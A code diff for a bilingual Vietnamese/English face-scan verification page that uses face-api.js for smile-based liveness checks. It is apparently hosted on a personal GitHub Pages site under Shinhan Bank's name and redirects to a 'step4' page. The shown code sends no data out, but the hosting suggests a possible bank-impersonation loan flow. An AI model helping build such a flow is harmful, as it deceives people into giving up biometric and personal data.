@@ -39,7 +39,7 @@
             overflow: hidden; /* Ngăn chặn cuộn trang */
             display: flex;
             flex-direction: column;
-            height: 100vh; /* Đảm bảo body chiếm toàn bộ chiều cao viewport */
+            height: 100dvh; /* Sử dụng dvh để tương thích tốt hơn trên mobile */
         }
 
         .hidden { display: none !important; }
@@ -224,7 +224,7 @@
             justify-content: center;
         }
         .status-message .fa-spinner { margin-right: 8px; font-size: 0.9em; }
-        .status-message span[data-lang-key="error"] { font-weight: 700; color: var(--error-color); text-decoration: none; /* Bỏ gạch chân mặc định */ }
+        .status-message span[data-lang-key="error"] { font-weight: 700; color: var(--error-color); text-decoration: none; }
         
         .button-group { margin-top: 20px; }
 
@@ -252,7 +252,7 @@
             text-align: center;
             transform: scale(0.9);
             transition: transform 0.3s ease;
-            box-shadow: var(--shadow); /* Thêm bóng đổ cho modal */
+            box-shadow: var(--shadow);
         }
         .modal-overlay.visible .modal-content { transform: scale(1); }
         .modal-content h4 { font-weight: 600; margin-bottom: 15px; }
@@ -326,42 +326,49 @@
         </div>
     </div>
 
-<!-- Font Awesome script để hiển thị icon -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
-
 <script>
 "use strict";
 
 const FaceScanApp = {
     // Quản lý trạng thái của ứng dụng
     state: {
-        stream: null, // Luồng video từ camera
-        detectionInterval: null, // ID của setInterval cho việc phát hiện khuôn mặt
-        modelsLoaded: false, // Trạng thái tải mô hình AI
-        currentStep: 0, // Bước hiện tại trong quy trình xác thực
-        totalSteps: 2, // Tổng số bước (1: Phát hiện khuôn mặt, 2: Mỉm cười)
-        actionTimeoutId: null, // ID của timeout cho hành động cụ thể (ví dụ: mỉm cười)
-        currentLang: 'vi', // Ngôn ngữ hiện tại
-        isSoundEnabled: false, // Trạng thái bật/tắt âm thanh
-        retryAttempts: 0, // Số lần thử lại cho bước hiện tại
+        stream: null,
+        detectionInterval: null,
+        modelsLoaded: false,
+        currentStep: 0,
+        totalSteps: 2,
+        actionTimeoutId: null,
+        currentLang: 'vi',
+        isSoundEnabled: false,
+        retryAttempts: 0,
     },
 
     elements: {}, // Cache các phần tử DOM
-    audioContext: null, // Web Audio API Context cho âm thanh
+    audioContext: null,
 
     // Cấu hình ứng dụng
     config: {
-        REDIRECT_URL: 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html', // URL chuyển hướng sau khi hoàn tất
-        MODEL_URL: 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@0.22.2/weights', // URL chứa các mô hình Face-API.js
-        SMILE_THRESHOLD: 0.7, // Ngưỡng xác suất để coi là "mỉm cười"
-        ACTION_TIMEOUT: 15000, // Thời gian tối đa để hoàn thành một hành động (ví dụ: mỉm cười)
-        MAX_RETRY_ATTEMPTS: 2, // Số lần thử lại tối đa cho mỗi bước
-        MODEL_LOAD_TIMEOUT: 30000, // Thời gian tối đa để tải các mô hình AI
-        BRIGHTNESS_THRESHOLD: 50, // Ngưỡng độ sáng tối thiểu của khung hình
-        HEAD_TILT_THRESHOLD: 10, // Độ nghiêng đầu tối đa cho phép (độ)
-        FACE_SIZE_MIN: 0.3, // Kích thước khuôn mặt tối thiểu trong khung hình (tỷ lệ so với chiều rộng video)
-        FACE_SIZE_MAX: 0.6, // Kích thước khuôn mặt tối đa trong khung hình
-        FACE_CENTER_THRESHOLD: 0.1, // Ngưỡng lệch tâm của khuôn mặt (tỷ lệ so với chiều rộng video)
+        REDIRECT_URL: 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html',
+        MODEL_URL: 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@0.22.2/weights',
+        SMILE_THRESHOLD: 0.7,
+        ACTION_TIMEOUT: 15000,
+        MAX_RETRY_ATTEMPTS: 2,
+        MODEL_LOAD_TIMEOUT: 30000,
+        BRIGHTNESS_THRESHOLD: 50,
+        HEAD_TILT_THRESHOLD: 10,
+        FACE_SIZE_MIN: 0.3,
+        FACE_SIZE_MAX: 0.6,
+        FACE_CENTER_THRESHOLD: 0.1,
+        // === FEATURE: Cấu hình độ phân giải camera ===
+        CAMERA_CONSTRAINTS: {
+            video: {
+                facingMode: 'user',
+                // Yêu cầu độ phân giải lý tưởng và tối thiểu
+                width: { ideal: 1280, min: 640 },
+                height: { ideal: 720, min: 480 },
+            },
+            audio: false
+        },
     },
     
     // Đối tượng chứa các bản dịch ngôn ngữ
@@ -379,10 +386,10 @@ const FaceScanApp = {
             errorBrowser: "Trình duyệt không hỗ trợ camera.",
             errorLoad: "Lỗi tải tài nguyên. Vui lòng thử lại.",
             errorLoadTimeout: "Tải tài nguyên quá lâu. Vui lòng kiểm tra kết nối và thử lại.",
-            errorCamera: "Lỗi không xác định. Vui lòng thử lại.",
+            errorCamera: "Không thể truy cập camera. Vui lòng kiểm tra và thử lại.",
             errorPermission: "Bạn đã từ chối quyền truy cập camera.",
             errorNotFound: "Không tìm thấy camera trên thiết bị.",
-            errorResolution: "Camera không đủ độ phân giải.",
+            errorResolution: "Camera không đáp ứng yêu cầu. Vui lòng dùng thiết bị khác.",
             errorBrightness: "Môi trường quá tối, vui lòng thêm sáng.",
             errorTimeout: "Hết thời gian. Vui lòng thử lại.",
             guidanceMoveCloser: "Di chuyển lại gần hơn",
@@ -408,10 +415,10 @@ const FaceScanApp = {
             errorBrowser: "Browser does not support camera.",
             errorLoad: "Error loading resources. Please try again.",
             errorLoadTimeout: "Resource loading timed out. Please check connection and retry.",
-            errorCamera: "Unknown error. Please try again.",
+            errorCamera: "Could not access the camera. Please check and try again.",
             errorPermission: "You have denied camera access.",
             errorNotFound: "No camera found on your device.",
-            errorResolution: "Camera resolution is too low.",
+            errorResolution: "Camera does not meet requirements. Please use another device.",
             errorBrightness: "Environment is too dark. Please add more light.",
             errorTimeout: "Action timed out. Please try again.",
             guidanceMoveCloser: "Move Closer",
@@ -428,17 +435,15 @@ const FaceScanApp = {
 
     // Khởi tạo ứng dụng
     async init() {
-        this.cacheDOMElements(); // Cache các phần tử DOM
-        // Kiểm tra hỗ trợ MediaDevices API
+        this.cacheDOMElements();
         if (!('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices)) {
             this.updateStatus("errorBrowser", 'error');
             return;
         }
-        // Thiết lập ngôn ngữ và âm thanh từ localStorage hoặc mặc định
         this.setLanguage(localStorage.getItem('preferredLang') || 'vi');
         this.setSound(localStorage.getItem('soundEnabled') === 'true');
-        this.addEventListeners(); // Thêm các sự kiện lắng nghe
-        await this.loadModels(); // Tải các mô hình AI
+        this.addEventListeners();
+        await this.loadModels();
     },
     
     // Tải các mô hình AI cần thiết cho Face-API.js
@@ -446,24 +451,23 @@ const FaceScanApp = {
         try {
             this.updateStatus("loadingModels", 'loading');
             const loadPromise = Promise.all([
-                faceapi.nets.tinyFaceDetector.loadFromUri(this.config.MODEL_URL), // Mô hình phát hiện khuôn mặt nhẹ
-                faceapi.nets.faceLandmark68Net.loadFromUri(this.config.MODEL_URL), // Mô hình phát hiện 68 điểm mốc trên khuôn mặt
-                faceapi.nets.faceExpressionNet.loadFromUri(this.config.MODEL_URL) // Mô hình phát hiện biểu cảm khuôn mặt
+                faceapi.nets.tinyFaceDetector.loadFromUri(this.config.MODEL_URL),
+                faceapi.nets.faceLandmark68Net.loadFromUri(this.config.MODEL_URL),
+                faceapi.nets.faceExpressionNet.loadFromUri(this.config.MODEL_URL)
             ]);
             
-            // Đặt timeout cho quá trình tải mô hình
             const timeoutPromise = new Promise((_, reject) => 
                 setTimeout(() => reject(new Error('Model loading timed out')), this.config.MODEL_LOAD_TIMEOUT)
             );
 
-            await Promise.race([loadPromise, timeoutPromise]); // Chờ tải xong hoặc timeout
+            await Promise.race([loadPromise, timeoutPromise]);
             
             this.state.modelsLoaded = true;
-            this.startCamera(); // Bắt đầu camera sau khi tải mô hình thành công
+            this.startCamera();
         } catch (error) {
-            this.logError(error); // Ghi log lỗi
+            this.logError(error);
             const messageKey = error.message.includes('timed out') ? 'errorLoadTimeout' : 'errorLoad';
-            this.updateStatus(messageKey, 'error', true); // Hiển thị lỗi
+            this.updateStatus(messageKey, 'error', true);
         }
     },
 
@@ -481,7 +485,6 @@ const FaceScanApp = {
         this.elements.langToggle.addEventListener('click', () => this.toggleLanguage());
         this.elements.soundToggle.addEventListener('click', () => this.toggleSound());
         this.elements.retryBtn.addEventListener('click', () => this.retryVerification());
-        // Lắng nghe sự kiện phím Escape để đóng modal
         window.addEventListener('keydown', (e) => {
             if (e.key === "Escape" && this.elements.confirmModal.classList.contains('visible')) {
                 this.showConfirmModal(false);
@@ -489,51 +492,51 @@ const FaceScanApp = {
         });
     },
     
-    // Bắt đầu luồng camera
+    // === FIX: Cải tiến logic khởi động và kiểm tra camera ===
     async startCamera() {
-        if (!this.state.modelsLoaded) return; // Chỉ bắt đầu nếu mô hình đã tải
+        if (!this.state.modelsLoaded) return;
+        this.updateStatus("loadingCamera", 'loading');
         try {
-            this.updateStatus("loadingCamera", 'loading');
-            // Yêu cầu luồng video từ camera trước (user)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            // Sử dụng các ràng buộc camera đã được định nghĩa trong config
+            const stream = await navigator.mediaDevices.getUserMedia(this.config.CAMERA_CONSTRAINTS);
             
-            // Kiểm tra độ phân giải của camera
+            // Xác thực lại độ phân giải của luồng video nhận được
             const settings = stream.getVideoTracks()[0].getSettings();
-            if(settings.width < 640 || settings.height < 480) {
-                 this.logError(new Error(`Low resolution: ${settings.width}x${settings.height}`));
+            if (settings.width < this.config.CAMERA_CONSTRAINTS.video.width.min || settings.height < this.config.CAMERA_CONSTRAINTS.video.height.min) {
+                 this.logError(new Error(`Resolution not met: ${settings.width}x${settings.height}`));
                  this.updateStatus("errorResolution", 'error', true);
-                 this.stopCamera(); // Dừng camera nếu độ phân giải thấp
+                 stream.getTracks().forEach(track => track.stop()); // Dừng luồng video không đạt yêu cầu
                  return;
             }
 
             this.state.stream = stream;
             this.elements.video.srcObject = stream;
-            // Khi video đã tải metadata, bắt đầu chạy phát hiện khuôn mặt
+            
             this.elements.video.onloadedmetadata = () => {
                 this.elements.progressIndicator.classList.remove('hidden');
-                this.elements.video.play(); // Đảm bảo video đang chạy
-                this.runFaceDetection(); // Bắt đầu vòng lặp phát hiện
+                this.elements.video.play();
+                this.runFaceDetection();
             };
         } catch (err) {
             this.logError(err);
-            let messageKey = "errorCamera"; // Lỗi chung
+            let messageKey = "errorCamera";
             if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") messageKey = "errorPermission";
             if (err.name === "NotFoundError" || err.name === "DevicesNotFoundError") messageKey = "errorNotFound";
-            this.updateStatus(messageKey, 'error', true); // Hiển thị lỗi vĩnh viễn
+            // Lỗi OverconstrainedError thường xảy ra khi không có camera nào đáp ứng yêu cầu
+            if (err.name === "OverconstrainedError") messageKey = "errorResolution";
+            this.updateStatus(messageKey, 'error', true);
         }
     },
 
     // Bắt đầu vòng lặp phát hiện khuôn mặt
     runFaceDetection() {
-        this.resetActionState(); // Reset trạng thái hành động
-        this.updateProgress(1); // Cập nhật thanh tiến trình bước 1
-        this.startActionTimeout(); // Bắt đầu timeout cho hành động
+        this.resetActionState();
+        this.updateProgress(1);
+        this.startActionTimeout();
         
-        // Thiết lập interval để liên tục phát hiện khuôn mặt
         this.state.detectionInterval = setInterval(async () => {
-            if (this.elements.video.paused || !this.state.stream || !this.state.stream.active) return;
+            if (this.elements.video.paused || !this.state.stream?.active) return;
 
-            // Kiểm tra độ sáng môi trường
             const brightness = this.getFrameBrightness();
             if (brightness < this.config.BRIGHTNESS_THRESHOLD) {
                 this.updateStatus("errorBrightness", 'error');
@@ -541,33 +544,30 @@ const FaceScanApp = {
                 return;
             }
 
-            // Phát hiện một khuôn mặt duy nhất và các điểm mốc, biểu cảm
             const detections = await faceapi.detectSingleFace(this.elements.video, new faceapi.TinyFaceDetectorOptions())
                                         .withFaceLandmarks()
                                         .withFaceExpressions();
             if (detections) {
-                // Kiểm tra vị trí và tư thế khuôn mặt
-                const isPositioned = this.checkFacePosition(detections);
-                if(isPositioned) {
-                    this.handleFaceDetected(detections); // Xử lý khi khuôn mặt đã được định vị
+                if (this.checkFacePosition(detections)) {
+                    this.handleFaceDetected(detections);
                 }
             } else {
-                 this.updateGuidance('guidanceCenterFace'); // Yêu cầu người dùng đưa mặt vào khung
+                 this.updateGuidance('guidanceCenterFace');
             }
-        }, 500); // Thực hiện mỗi 500ms
+        }, 500);
     },
 
     // Xử lý khi khuôn mặt được phát hiện và định vị đúng
     handleFaceDetected(detections) {
-        this.clearActionTimeout(); // Xóa timeout hiện tại
-        this.updateProgress(2); // Cập nhật thanh tiến trình bước 2
-        const smileProbability = detections.expressions.happy; // Lấy xác suất biểu cảm "happy"
+        this.clearActionTimeout();
+        this.updateProgress(2);
+        const smileProbability = detections.expressions.happy;
 
         if (smileProbability > this.config.SMILE_THRESHOLD) {
-            clearInterval(this.state.detectionInterval); // Dừng vòng lặp phát hiện
-            this.handleVerificationSuccess(); // Xử lý thành công
+            clearInterval(this.state.detectionInterval);
+            this.handleVerificationSuccess();
         } else {
-            this.updateStatus("faceDetected", 'scanning'); // Yêu cầu mỉm cười
+            this.updateStatus("faceDetected", 'scanning');
             this.updateGuidance(this.state.currentLang === 'vi' ? 'Vui lòng mỉm cười' : 'Please smile');
         }
     },
@@ -575,11 +575,11 @@ const FaceScanApp = {
     // Xử lý khi xác thực thành công
     handleVerificationSuccess() {
         this.resetActionState();
-        this.updateProgress(this.state.totalSteps); // Hoàn tất thanh tiến trình
+        this.updateProgress(this.state.totalSteps);
         this.updateStatus("success", 'success');
-        this.playBeep(523.25, 150); // Phát âm thanh thành công (C5)
-        this.stopCamera(); // Dừng camera
-        setTimeout(() => window.location.href = this.config.REDIRECT_URL, 1500); // Chuyển hướng
+        this.playBeep(523.25, 150);
+        this.stopCamera();
+        setTimeout(() => window.location.href = this.config.REDIRECT_URL, 1500);
     },
     
     // Cập nhật thanh tiến trình
@@ -588,7 +588,7 @@ const FaceScanApp = {
         const percentage = (step / this.state.totalSteps) * 100;
         this.elements.progressBar.style.width = `${percentage}%`;
         this.elements.progressBar.setAttribute('aria-valuenow', percentage);
-        this.updateStepLabel(); // Cập nhật nhãn bước
+        this.updateStepLabel();
     },
     
     // Cập nhật nhãn của bước hiện tại
@@ -599,29 +599,23 @@ const FaceScanApp = {
 
     // Cập nhật thông báo trạng thái và hiệu ứng overlay
     updateStatus(messageKey, status = 'loading', showRetry = false) {
-        const isError = status === 'error';
-        const message = this.translations[this.state.currentLang][messageKey] || messageKey; // Fallback to key if translation not found
+        const message = this.translations[this.state.currentLang][messageKey] || messageKey;
         const iconHtml = status === 'loading' ? '<i class="fas fa-spinner fa-spin"></i> ' : '';
-        const messageHtml = `${iconHtml} <span ${isError ? 'data-lang-key="error"' : ''}>${message}</span>`;
+        this.elements.statusMessage.innerHTML = `${iconHtml} <span ${status === 'error' ? 'data-lang-key="error"' : ''}>${message}</span>`;
+        this.elements.retryBtn.classList.toggle('hidden', !showRetry);
         
-        this.elements.statusMessage.innerHTML = messageHtml;
-        this.elements.scanOverlay.className = 'scan-overlay'; // Reset các lớp CSS
-        if(showRetry) this.elements.retryBtn.classList.remove('hidden');
-        else this.elements.retryBtn.classList.add('hidden');
-        
-        switch(status) {
-            case 'success': this.elements.scanOverlay.classList.add('success'); break;
-            case 'error': this.elements.scanOverlay.classList.add('error'); break;
-            case 'scanning': this.elements.scanOverlay.classList.add('scanning'); break;
-            default: this.elements.scanOverlay.classList.add('pulse'); break;
-        }
+        this.elements.scanOverlay.className = 'scan-overlay';
+        if (status === 'success') this.elements.scanOverlay.classList.add('success');
+        else if (status === 'error') this.elements.scanOverlay.classList.add('error');
+        else if (status === 'scanning') this.elements.scanOverlay.classList.add('scanning');
+        else this.elements.scanOverlay.classList.add('pulse');
     },
 
     // Tính toán độ sáng trung bình của khung hình camera
     getFrameBrightness() {
-        const canvas = document.createElement('canvas'); // Tạo canvas tạm thời
+        const canvas = document.createElement('canvas');
         const video = this.elements.video;
-        if (!video.videoWidth || !video.videoHeight) return 0; // Tránh lỗi nếu video chưa tải
+        if (!video.videoWidth || !video.videoHeight) return 0;
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d', { willReadFrequently: true });
@@ -630,55 +624,43 @@ const FaceScanApp = {
             const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
             let sum = 0;
             for (let i = 0; i < imageData.length; i += 4) {
-                // Tính giá trị xám trung bình của mỗi pixel
-                sum += (imageData[i] * 0.299 + imageData[i+1] * 0.587 + imageData[i+2] * 0.114); // Công thức chuẩn cho độ sáng
+                sum += (imageData[i] * 0.299 + imageData[i+1] * 0.587 + imageData[i+2] * 0.114);
             }
-            return sum / (imageData.length / 4); // Trả về độ sáng trung bình
+            return sum / (imageData.length / 4);
         } catch (e) {
-            this.logError(e);
-            console.warn("Could not get image data from canvas for brightness check. Returning 0.");
-            return 0; // Trả về 0 nếu không thể lấy dữ liệu ảnh
-        } finally {
-            canvas.remove(); // Xóa canvas tạm thời
+            this.logError(e, "Could not get image data for brightness check.");
+            return 100; // Giả định đủ sáng nếu có lỗi
         }
     },
 
     // Kiểm tra vị trí và tư thế của khuôn mặt trong khung
     checkFacePosition(detections) {
-        const box = detections.detection.box;
-        const video = this.elements.video;
-        const videoWidth = video.videoWidth;
-        const videoHeight = video.videoHeight;
+        const { box } = detections.detection;
+        const { videoWidth } = this.elements.video;
 
-        // Tính toán kích thước khuôn mặt so với chiều rộng video
         const faceWidthRatio = box.width / videoWidth;
-        // Tính toán tâm khuôn mặt theo trục X
         const faceCenterXRatio = (box.x + box.width / 2) / videoWidth;
         
-        // Kiểm tra độ nghiêng đầu (Head Tilt)
-        const landmarks = detections.landmarks;
+        const { landmarks } = detections;
         const leftEye = landmarks.getLeftEye()[0]; 
         const rightEye = landmarks.getRightEye()[3]; 
         const angle = Math.atan2(rightEye.y - leftEye.y, rightEye.x - leftEye.x) * 180 / Math.PI;
 
         if (Math.abs(angle) > this.config.HEAD_TILT_THRESHOLD) {
-            this.updateGuidance('guidanceStraightenHead'); 
-            return false;
+            this.updateGuidance('guidanceStraightenHead'); return false;
+        }
+        if (faceWidthRatio > this.config.FACE_SIZE_MAX) {
+            this.updateGuidance('guidanceMoveFurther'); return false;
+        }
+        if (faceWidthRatio < this.config.FACE_SIZE_MIN) {
+            this.updateGuidance('guidanceMoveCloser'); return false;
+        }
+        if (Math.abs(faceCenterXRatio - 0.5) > this.config.FACE_CENTER_THRESHOLD) {
+            this.updateGuidance('guidanceCenterFace'); return false;
         }
         
-        if (faceWidthRatio > this.config.FACE_SIZE_MAX) {
-            this.updateGuidance('guidanceMoveFurther'); 
-            return false;
-        } else if (faceWidthRatio < this.config.FACE_SIZE_MIN) {
-            this.updateGuidance('guidanceMoveCloser'); 
-            return false;
-        } else if (Math.abs(faceCenterXRatio - 0.5) > this.config.FACE_CENTER_THRESHOLD) { // 0.5 là trung tâm
-            this.updateGuidance('guidanceCenterFace'); 
-            return false;
-        } else {
-            this.updateGuidance(''); // Không có hướng dẫn nếu mọi thứ đều ổn
-            return true;
-        }
+        this.updateGuidance('');
+        return true;
     },
 
     // Cập nhật thông báo hướng dẫn trên overlay
@@ -689,121 +671,93 @@ const FaceScanApp = {
     // Hàm thử lại quá trình xác thực
     retryVerification() {
         this.elements.retryBtn.classList.add('hidden');
-        this.stopCamera(); // Dừng camera hiện tại
-        this.startCamera(); // Bắt đầu lại camera
+        this.stopCamera();
+        this.startCamera();
     },
     
-    // Bắt đầu timeout cho các hành động (ví dụ: mỉm cười trong X giây)
+    // Bắt đầu timeout cho các hành động
     startActionTimeout() {
         this.clearActionTimeout();
         this.state.actionTimeoutId = setTimeout(() => {
             if(this.state.detectionInterval) {
-                 clearInterval(this.state.detectionInterval); // Dừng phát hiện
+                 clearInterval(this.state.detectionInterval);
                  this.state.retryAttempts++;
                  if(this.state.retryAttempts >= this.config.MAX_RETRY_ATTEMPTS){
-                     this.updateStatus("errorTimeout", 'error', true); // Lỗi và hiển thị nút thử lại
+                     this.updateStatus("errorTimeout", 'error', true);
                  } else {
-                     this.updateStatus("errorTimeout", 'error', false); // Lỗi nhưng sẽ tự động thử lại
-                     setTimeout(() => this.retryVerification(), 2000); // Thử lại sau 2 giây
+                     this.updateStatus("errorTimeout", 'error', false);
+                     setTimeout(() => this.retryVerification(), 2000);
                  }
             }
         }, this.config.ACTION_TIMEOUT);
     },
     
-    // Reset trạng thái thử lại
     resetActionState() {
         this.state.retryAttempts = 0;
         this.clearActionTimeout();
     },
 
-    // Xóa timeout hiện tại
     clearActionTimeout() {
-        if(this.state.actionTimeoutId) {
-            clearTimeout(this.state.actionTimeoutId);
-            this.state.actionTimeoutId = null;
-        }
+        if(this.state.actionTimeoutId) clearTimeout(this.state.actionTimeoutId);
+        this.state.actionTimeoutId = null;
     },
     
     // Dừng luồng camera và giải phóng tài nguyên
     stopCamera() {
         this.clearActionTimeout();
-        if (this.state.detectionInterval) {
-            clearInterval(this.state.detectionInterval);
-            this.state.detectionInterval = null;
-        }
-        if (this.state.stream) {
-            this.state.stream.getTracks().forEach(track => track.stop());
-            this.state.stream = null;
-        }
-        this.elements.video.srcObject = null; // Gỡ bỏ srcObject khỏi video
-        // Có thể ẩn các phần tử liên quan đến camera nếu cần
-        this.elements.progressIndicator.classList.add('hidden'); // Ẩn thanh tiến trình khi camera dừng
-        this.updateGuidance(''); // Xóa thông báo hướng dẫn
+        if (this.state.detectionInterval) clearInterval(this.state.detectionInterval);
+        this.state.detectionInterval = null;
+        if (this.state.stream) this.state.stream.getTracks().forEach(track => track.stop());
+        this.state.stream = null;
+        this.elements.video.srcObject = null;
+        this.elements.progressIndicator.classList.add('hidden');
+        this.updateGuidance('');
     },
     
     // Dừng camera và quay lại trang trước đó
     stopAndGoBack() {
         this.stopCamera();
-        window.history.back();
+        // Giả sử có một trang trước đó trong lịch sử, nếu không thì chuyển về trang chủ
+        if (window.history.length > 1) {
+            window.history.back();
+        } else {
+            window.location.href = 'https://vaytieudung.github.io/shinhanbank/';
+        }
     },
 
-    // Hiển thị/ẩn modal xác nhận thoát
-    showConfirmModal(show) {
-        this.elements.confirmModal.classList.toggle('visible', show);
-    },
+    showConfirmModal(show) { this.elements.confirmModal.classList.toggle('visible', show); },
+    toggleLanguage() { this.setLanguage(this.state.currentLang === 'vi' ? 'en' : 'vi'); },
     
-    // Chuyển đổi ngôn ngữ giữa tiếng Việt và tiếng Anh
-    toggleLanguage() {
-        const newLang = this.state.currentLang === 'vi' ? 'en' : 'vi';
-        this.setLanguage(newLang);
-    },
-    
-    // Đặt ngôn ngữ ứng dụng
     setLanguage(lang) {
         this.state.currentLang = lang;
-        localStorage.setItem('preferredLang', lang); // Lưu vào localStorage
-        this.elements.langToggle.textContent = lang === 'vi' ? 'EN' : 'VI'; // Cập nhật nút ngôn ngữ
-        // Duyệt qua tất cả các phần tử có thuộc tính data-lang và cập nhật nội dung
+        localStorage.setItem('preferredLang', lang);
+        this.elements.langToggle.textContent = lang === 'vi' ? 'EN' : 'VI';
         document.querySelectorAll('[data-lang]').forEach(el => {
             const key = el.dataset.lang;
-            if (this.translations[lang] && this.translations[lang][key]) {
-                // Kiểm tra xem có icon bên trong không để giữ lại
+            if (this.translations[lang]?.[key]) {
                 const icon = el.querySelector('i');
-                if(icon) {
-                    // Nếu có icon, chèn icon và text mới
-                    el.innerHTML = `${icon.outerHTML} ${this.translations[lang][key]}`;
-                } else {
-                    el.textContent = this.translations[lang][key];
-                }
+                el.innerHTML = icon ? `${icon.outerHTML} ${this.translations[lang][key]}` : this.translations[lang][key];
             }
         });
-        this.updateStepLabel(); // Cập nhật lại nhãn bước
+        this.updateStepLabel();
     },
     
-    // Chuyển đổi trạng thái âm thanh
-    toggleSound() {
-        this.setSound(!this.state.isSoundEnabled);
-    },
+    toggleSound() { this.setSound(!this.state.isSoundEnabled); },
 
-    // Đặt trạng thái âm thanh
     setSound(enabled) {
         this.state.isSoundEnabled = enabled;
-        localStorage.setItem('soundEnabled', enabled); // Lưu vào localStorage
+        localStorage.setItem('soundEnabled', enabled);
         this.elements.soundToggle.innerHTML = `<i class="fas ${enabled ? 'fa-volume-up' : 'fa-volume-off'}"></i>`;
-        // Khởi tạo AudioContext nếu âm thanh được bật lần đầu
         if (enabled && !this.audioContext) {
-            try { 
-                this.audioContext = new (window.AudioContext || window.webkitAudioContext)(); 
-            }
+            try { this.audioContext = new (window.AudioContext || window.webkitAudioContext)(); }
             catch(e) { 
-                this.logError(e); 
-                this.state.isSoundEnabled = false; // Tắt âm thanh nếu không thể khởi tạo AudioContext
-                this.elements.soundToggle.innerHTML = `<i class="fas fa-volume-off"></i>`; // Đảm bảo icon tắt
+                this.logError(e, "AudioContext not supported.");
+                this.state.isSoundEnabled = false;
+                this.elements.soundToggle.innerHTML = `<i class="fas fa-volume-off"></i>`;
             }
         }
     },
     
-    // Phát một tiếng "beep"
     playBeep(frequency = 440, duration = 100) {
         if (!this.state.isSoundEnabled || !this.audioContext) return;
         try {
@@ -811,34 +765,26 @@ const FaceScanApp = {
             const gainNode = this.audioContext.createGain();
             oscillator.connect(gainNode);
             gainNode.connect(this.audioContext.destination);
-            oscillator.type = 'sine'; // Sóng sine
-            oscillator.frequency.value = frequency; // Tần số (Hz)
-            // Hiệu ứng fade in/out cho âm thanh
+            oscillator.type = 'sine';
+            oscillator.frequency.value = frequency;
             gainNode.gain.setValueAtTime(0, this.audioContext.currentTime);
             gainNode.gain.linearRampToValueAtTime(1, this.audioContext.currentTime + 0.01);
             oscillator.start(this.audioContext.currentTime);
             gainNode.gain.exponentialRampToValueAtTime(0.00001, this.audioContext.currentTime + duration / 1000);
             oscillator.stop(this.audioContext.currentTime + duration / 1000);
-        } catch(e) { this.logError(e); }
+        } catch(e) { this.logError(e, "Beep failed."); }
     },
 
-    // Ghi log lỗi vào console và localStorage
-    logError(error) {
+    logError(error, context = "General Error") {
+        console.error(`[${context}]`, error);
         try {
-            console.error(error); // Ghi log vào console để debug
             const errors = JSON.parse(localStorage.getItem('errorLogs') || '[]');
-            errors.push({
-                timestamp: new Date().toISOString(),
-                message: error.message,
-                name: error.name,
-                stack: error.stack
-            });
-            localStorage.setItem('errorLogs', JSON.stringify(errors.slice(-10))); // Giữ 10 lỗi gần nhất
-        } catch(e) { console.error("Không thể ghi log lỗi vào localStorage", e); }
+            errors.push({ timestamp: new Date().toISOString(), message: error.message, name: error.name, context });
+            localStorage.setItem('errorLogs', JSON.stringify(errors.slice(-10)));
+        } catch(e) { console.error("Failed to write to localStorage.", e); }
     }
 };
 
-// Khởi tạo ứng dụng khi DOM đã tải hoàn chỉnh
 document.addEventListener('DOMContentLoaded', () => {
     FaceScanApp.init();
 });
